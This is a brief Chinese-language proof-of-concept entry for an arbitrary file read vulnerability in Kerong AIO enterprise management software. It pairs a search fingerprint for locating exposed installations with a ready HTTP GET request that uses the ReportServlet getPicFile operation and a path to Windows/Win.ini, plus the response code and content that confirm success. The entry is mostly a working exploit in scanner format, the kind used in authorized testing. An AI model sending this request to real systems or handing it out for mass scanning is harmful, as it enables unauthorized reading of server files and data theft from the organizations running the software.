﻿# 科荣AIO任意文件读取漏洞

> 更新时间：2023-12-31

> 漏洞编号：

> 漏洞说明：科荣AIO---集成进销存,财务,OA,CRM,HR,电子商务一体化企业管理软件。该系统存在任意文件读取漏洞。

> 漏洞特征：body="changeAccount('8000')"

> 验证脚本：HTTP

```
GET /ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：


> 验证文件来源：科荣AIO任意文件读取漏洞.poc
